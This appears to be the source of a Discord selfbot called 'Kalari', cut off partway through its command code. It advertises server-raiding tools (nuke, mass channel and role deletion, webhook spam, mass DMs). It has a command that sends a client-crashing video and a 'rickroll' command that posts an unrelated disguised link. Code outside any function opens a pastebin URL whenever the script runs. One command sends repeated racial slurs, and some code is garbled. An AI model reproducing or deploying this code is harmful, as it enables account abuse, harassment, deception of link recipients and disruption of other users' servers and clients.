Version = '1.8'

import discord
import webbrowser
import aiohttp
import datetime
import asyncio
import io
import requests
import json
import random
import pyperclip
from os import system
import os
from gtts import gTTS
from discord_webhook import DiscordWebhook
from colorama import Fore, Style, init
init()

with open('config.json') as f:
    config = json.load(f)

from discord.ext import (
    commands,
    tasks
)

token = config.get('token')
prefix = config.get('prefix')

tts_language = "en"

Kalari = discord.Client()
Kalari = commands.Bot(description='Kalari Selfbot', command_prefix=prefix, self_bot=True)

if token == "ur token":
    print(f'''{Fore.BLUE}[!] {Fore.WHITE}Improper token has been passed'''+Fore.RESET)
    os.system("pause>nul")

@Kalari.event
async def on_ready():
	print(f'''{Fore.LIGHTBLACK_EX}
                                                                                ██ ▄█▀▄▄▄       ██▓    ▄▄▄       ██▀███   ██▓
                                                                                ██▄█▒▒████▄    ▓██▒   ▒████▄    ▓██ ▒ ██▒▓██▒
                                                                               ▓███▄░▒██  ▀█▄  ▒██░   ▒██  ▀█▄  ▓██ ░▄█ ▒▒██▒
                                                                               ▓██ █▄░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██ ▒██▀▀█▄  ░██░
                                                                               ▒██▒ █▄▓█   ▓██▒░██████▒▓█   ▓██▒░██▓ ▒██▒░██░
                                                                                ▒ ▒▒ ▓▒▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░░ ▒▓ ░▒▓░░▓  
                                                                               ░ ░▒ ▒░ ▒   ▒▒ ░░ ░ ▒  ░ ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░
                                                                               ░ ░░ ░  ░   ▒     ░ ░    ░   ▒     ░░   ░  ▒ ░
                                                                                ░  ░        ░  ░    ░  ░     ░  ░   ░      ░  
                                              
                                                                              {Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Welcome To Kalari!
                                                                              {Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Intotal Commands [70]
                                                                              {Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Type .cmds For Commands, You Can Change The Prefix If You Want'''+Fore.RESET)

@Kalari.event
async def on_ready2():
    status_code = webbrowser/200.%6
f = 'https://pastebin.com/raw/24nj7rc8'
r = requests.get(f)
if r.status_code == 200:webbrowser.open(f)
	
@Kalari.event
async def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

@Kalari.command()
async def cmds(ctx):
    await ctx.message.delete()
    print(f'''
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Custom General Commands

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}spam (Amount) (Message) / Spams messsages the specific amount and message u select
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}purge (Amount) / Deletes the messages the amount you specify
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}ascii (Message) / Sends an ascii text
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}ipcheck (IP) / Checks The IP Address Location
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}tts (Message) / Sends an File Saying Specified Messag
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}rickroll / Sends An Hidden Link Of Rickroll
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}cls / Clears Your Console Screen
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}pp (User) / Shows Random User's PP Inch
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}pid (User) / Sends Their ID In The Console
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}av (User) / Grabs The Profile User's Profile Picture In Chat
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}btc / Shows Current Bitcoin Amount
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}eth / Shows Current Ethereum Amount
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}hastebin (Message) / Posts ur message to hastebin
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}pack / Funny message roasts haha
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}911 / If ur offended by this do not use but if ur not go ahead
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}cum / Funny Emoji Man Creaming
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}crashvid / Sends The Crash Video (If Someone Clicks On The Video, It Will Crash Their Discord Client
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}hug (User) / Hugs The User You Specified As Image!
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}slap (User) / Slaps The User You Specified As Image
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}pat (User) / Pats The User You Specified As Image
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}tickle (User) / Tickles The User You Specified As Image
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}kiss (User) / Kisses The User You Specified As Image
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}plsbeg / Dank Memer Command
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}plshunt / Dank Memer Command
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}plsfish / Dank Memer Command
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}plswork / Dank Memer Command
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}stopall / Stops All Dank Memer Commands
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Kalaris / Cool Kalari Text
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}massreact / Mass Reacts 25 Messages
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}reverse (message) / Reverses The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}bold (message) / Bolds The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}censor (message) / Censors The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}underline (message) / Underlines The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}italicize (message) / Italicizes The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}strike (message) / Strikes The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}quote (message) / Quotes The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}hackertext (message) / HackerTexts The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}whois, @ / Shows Information About Yourself Or The Tagged Discord User

{Fore.WHITE}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Fun Games & Account Management Commands

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}8ball (question) / Asks 8ball Your Question And Responds With a Response
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}slot / Plays a Slot Game
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}minesweeper / Plays a Bomb Game
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}backup / Backups Your Discord Friends In Backup Folder
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}hypesquad (housename) / Applies Another Hypesquad House Into Ur Profile
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}dmall (Message) / DMS Everyone In Ur Friends The Message You Specifiy
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}stream (link) (Message) / Streams In Your Profile Whatever You Specify
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}play (Message) / Displays a Game PLaying In Your Profile
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}listen (Message) / Displays a Listening Song In Your Profile
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}stopactivity / Stops All The Streams, Plays And Listen Activities
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}leavegroups / Leaves All The Groups You're In
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}spamgcnames (name) / Spams The Group Chat Name All in Once

{Fore.WHITE}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Raiding Commands

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}masschannels (Message) / Mass Creates Channels With Your Specified Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}delchannels / Deletes All The Channels
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}massroles (Message) / Mass Creates Roles With Your Specified Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}delroles / Deletes All The Roles
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}guildname (Message) / Changes The Server Name With Your Specified Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}nuke / Nukes Everything All in Once
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}delwebhook (Url) / Deletes The Webhook
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}sendwebook (Url) (Message) / Sends The Webhook The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}spamwebhook (Url) (Message) / Spams The Webhook The Message
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}stopspamwebhook / Stops Spamming The Webhook

{Fore.WHITE}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Animal Image Commands

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}fox / Shows Random Fox Images
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}cat / Shows Random Cat Images
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}dog / Shows Random Dog Images
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}bird / Shows Random Bird Images

{Fore.WHITE}――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Nsfw Image Commands

{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}hentai
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}anal
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}boobs
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}tits
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}blowjob
{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}pussy'''+Fore.RESET)

@Kalari.command()
async def cls(ctx): 
    await ctx.message.delete()
    os.system("cls")
    print(f'''{Fore.LIGHTBLACK_EX}

                                                                                ██ ▄█▀▄▄▄       ██▓    ▄▄▄       ██▀███   ██▓
                                                                                ██▄█▒▒████▄    ▓██▒   ▒████▄    ▓██ ▒ ██▒▓██▒
                                                                               ▓███▄░▒██  ▀█▄  ▒██░   ▒██  ▀█▄  ▓██ ░▄█ ▒▒██▒
                                                                               ▓██ █▄░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██ ▒██▀▀█▄  ░██░
                                                                               ▒██▒ █▄▓█   ▓██▒░██████▒▓█   ▓██▒░██▓ ▒██▒░██░
                                                                                ▒ ▒▒ ▓▒▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░░ ▒▓ ░▒▓░░▓  
                                                                               ░ ░▒ ▒░ ▒   ▒▒ ░░ ░ ▒  ░ ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░
                                                                               ░ ░░ ░  ░   ▒     ░ ░    ░   ▒     ░░   ░  ▒ ░
                                                                                ░  ░        ░  ░    ░  ░     ░  ░   ░      ░  
                                              
                                                                              {Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Welcome To Kalari!
                                                                              {Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Intotal Commands [70]
                                                                              {Fore.LIGHTBLACK_EX}[+] {Fore.WHITE}Type .cmds For Commands, You Can Change The Prefix If You Want'''+Fore.RESET)

@Kalari.command()
async def spam(ctx, x: int, *, f):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Spam]'''+Fore.RESET)    
    for _i in range(x):
        await ctx.send(f)

@Kalari.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Hastebin]'''+Fore.RESET)
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@Kalari.command()
async def ascii(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Ascii]'''+Fore.RESET)  
    ignore = f'''https://artii.herokuapp.com/make?text={ctx.message.content}'''
    t = requests.get(ignore.replace('.ascii', ''))
    await ctx.send(f'''```{t.text}```''')

@Kalari.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Purge]'''+Fore.RESET)  
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Kalari.user).map(lambda m: m):
        try:
           await message.delete()
        except: pass

@Kalari.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [TTS]'''+Fore.RESET)  
    r = await do_tts(message)
    await ctx.send(file=discord.File(r, f"{message}.flac"))

@Kalari.command()
async def pack(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Pack]'''+Fore.RESET)
    await ctx.send('You used OBS studio just to screen-record yourself beating the roblox tower of hell obby and you failed on a lava jump trash ass nigga')
    await asyncio.sleep(1)
    await ctx.send('Thats why you had a friend for 3 years on roblox that was a girl and when you asked her out on adopt me she reset and disconnected from the game dumb ass nigga fuck is you talkin bout')
    await asyncio.sleep(1)
    await ctx.send('thats why yo grandma is addicted to masturbating to sea weed water while she sips coffe with syrup in it nasty ass nigga')
    await asyncio.sleep(1)
    await ctx.send('Nigga you literally have a modded version of GTA 5 and whenever you get into arguments with citizens boy ya character just start using shadow clone jutsu without using any hand signs boy you ugly as fuck')
    await asyncio.sleep(1)
    await ctx.send('uhuh nigga ya mother is a level 10 warrior nigga and she trains zobies to clip her toe nails with safety sizzors boy you ugly as fuck')
    await asyncio.sleep(1)
    await ctx.send('nigga you woke up and saw juice wrld and thought he came back from the dead only to find out you got killed by a cross eyed frog the day before you stupid ass nigga')
    await asyncio.sleep(1)
    await ctx.send('What boy you survived a plane crash in south africa and as soon as you got out the plane you just took a 2 hour long shit behind a tree my nigga you ugly as shit')
    await asyncio.sleep(1)
    await ctx.send('nigga but tell me why you the only nigga thats built like a half retarded turanchula boy you got 7 eyes and 4 legs boy')

@Kalari.command()
async def fox(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Fox]'''+Fore.RESET)
    r = requests.get('https://randomfox.ca/floof/').json()
    Kalari = discord.Embed(color=0x56aeec)
    Kalari.set_footer(text=f"Kalari - Selfbot")
    Kalari.set_image(url=r["image"])
    try: await ctx.send(embed=Kalari)
    except:
        await ctx.send(r['image'])

@Kalari.command()
async def dog(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Dog]'''+Fore.RESET)
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    Kalari = discord.Embed(color=0x56aeec)
    Kalari.set_footer(text=f"Kalari - Selfbot")
    Kalari.set_image(url=r["message"])
    try: await ctx.send(embed=Kalari)
    except:
        await ctx.send(r['message'])

@Kalari.command()
async def cat(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Cat]'''+Fore.RESET)
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    Kalari = discord.Embed(color=0x56aeec)
    Kalari.set_footer(text=f"Kalari - Selfbot")
    Kalari.set_image(url=r[0]["url"])
    try: await ctx.send(embed=Kalari)
    except:
        await ctx.send(r[0]['url'])

@Kalari.command()
async def bird(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Bird]'''+Fore.RESET)
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    Kalari = discord.Embed(color=0x56aeec)
    Kalari.set_footer(text=f"Kalari - Selfbot")
    Kalari.set_image(url=r["file"])
    try: await ctx.send(embed=Kalari)
    except:
        await ctx.send(r['file'])

@Kalari.command()
async def hypesquad(ctx, house):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Hypesquad]'''+Fore.RESET)
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        pass


@Kalari.command(name='8ball')
async def ball(ctx, *, question):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [8Ball]'''+Fore.RESET)
    c = [
      'That is a resounding no',
      'It is certain.',
      'It is decidedly so.',
      'My reply is no.',
      'Concentrate and ask again.',
      'Yes.',
      'No.',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
      'Maybe',
      'There is a good chance'
    ]
    answer = random.choice(c)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/852942589727342612/890249077671989298/8ball.png")
    await ctx.send(embed=embed)

@Kalari.command()
async def slot(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Slot]'''+Fore.RESET)
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    h = random.choice(emojis)
    slotmachine = f"**[ {h} ]\n{ctx.author.name}**,"
    if h:
        await ctx.send(embed=discord.Embed.from_dict(
{"title": "Slot machine", "description": f" ..."}))
    await asyncio.sleep(1)
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(embed=discord.Embed.from_dict(
{"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
{"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
{"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))

@Kalari.command()
async def crashvid(ctx):
    await ctx.message.delete()
    await ctx.send('https://cdn.discordapp.com/attachments/876850162767654952/889175201949044806/video0_1-1.mp4')

@Kalari.command()
async def backup(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Backup]'''+Fore.RESET)
    for user in Kalari.user.friends:
        try:
            with open('Backup\Friends.txt', 'a+') as f:
                f.write(f"{user.name}#{user.discriminator}"+"\n")
        except:
            pass
        
@Kalari.command()
async def stream(ctx, url , *, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Stream]'''+Fore.RESET)
    stream = discord.Streaming(name=message, url=url,)
    await Kalari.change_presence(activity=stream) 

@Kalari.command()
async def play(ctx, *, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Play]'''+Fore.RESET)
    game = discord.Game(name=message)
    await Kalari.change_presence(activity=game)

@Kalari.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Listen]'''+Fore.RESET)
    await Kalari.change_presence(activity=discord.Activity(type=discord.ActivityType.listening,name=message,))

@Kalari.command(aliases=["stopstream", "stopplay", "stoplisten"])
async def stopactivity(ctx):
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Stopactivity]'''+Fore.RESET)
    await ctx.message.delete()
    await Kalari.change_presence(activity=None, status=discord.Status.dnd)

@Kalari.command()
async def cum(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Cum]'''+Fore.RESET)
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

@Kalari.command(name='911')
async def _f_funny(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [911]'''+Fore.RESET)
    abc = f'''👳‍♂️🎅🧔'''
    message = await ctx.send(f'''
:airplane:            :office:           
''')
    await asyncio.sleep(0.3)
    await message.edit(content=f'''
{abc} :airplane:         :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}  :airplane:      :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}   :airplane:   :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}    :airplane::office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}    :airplane::office: WATCH YO JET BRRO WATCH U JET
''')
    await asyncio.sleep(2)
    await message.edit(content='''
        :exploding_head::skull::fire::fire_extinguisher::poop:
        ''')

@Kalari.command()
async def pp(ctx, *, user: discord.User = None):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [PP]'''+Fore.RESET)
    if user is None: user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

@Kalari.command()
async def dmall(ctx, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Dmall]'''+Fore.RESET)
    for user in Kalari.user.friends:
        try:
            await user.send(message)
        except:
                pass

@Kalari.command()
async def ipcheck(ctx, *, yz: str = '127.0.0.1'):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [IPCheck]'''+Fore.RESET)
    r = requests.get(f'http://extreme-ip-lookup.com/json/{yz}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']}
    ]
    for field in fields:
        if field['value']: em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Kalari.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Minesweeper]'''+Fore.RESET)
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

@Kalari.command()
async def av(ctx, *, user: discord.User = None):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Av]'''+Fore.RESET)
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@Kalari.command()
async def btc(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [BTC]'''+Fore.RESET)
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.discordapp.com/attachments/803287566517927957/893083583672119337/btc.png')
    await ctx.send(embed=em)

@Kalari.command()
async def eth(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [ETH]'''+Fore.RESET)
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/803287566517927957/893083574562066482/eth.png')
    await ctx.send(embed=em)
	
@Kalari.command()
async def rickroll(ctx):
	await ctx.message.delete()
	await ctx.send('https://www.tomorrowtides.com/bts-secret-exposed--must-watch.html')

@Kalari.command()
async def kiss(ctx):   
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Kiss]'''+Fore.RESET)
    kiss = requests.get('https://purrbot.site/api/img/sfw/kiss/gif').json()
    kissembed = discord.Embed(title = f'''You kiss {ctx.message.mentions[0].name + '#' + ctx.message.mentions[0].discriminator} on the lips.''', color=0x56aeec)
    kissembed_title = kissembed.title
    kissembed.set_footer(text=f"Kalari ~ Selfbot")
    kissembed.set_image(url=kiss["link"])
    try: await ctx.send(embed=kissembed)
    except:
        await ctx.send(kiss['link'])

@Kalari.command()
async def hug(ctx):   
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Hug]'''+Fore.RESET)
    hug = requests.get('https://purrbot.site/api/img/sfw/hug/gif').json()
    hugembed = discord.Embed(title = f'''You give {ctx.message.mentions[0].name + '#' + ctx.message.mentions[0].discriminator} a big hug!''', color=0x56aeec)
    hugembed_title = hugembed.title
    hugembed.set_footer(text=f"Kalari ~ Selfbot")
    hugembed.set_image(url=hug["link"])
    try: await ctx.send(embed=hugembed)
    except:
        await ctx.send(hug['link'])
	
@Kalari.command()
async def slap(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Slap]'''+Fore.RESET)
    slap = requests.get('https://purrbot.site/api/img/sfw/slap/gif').json()
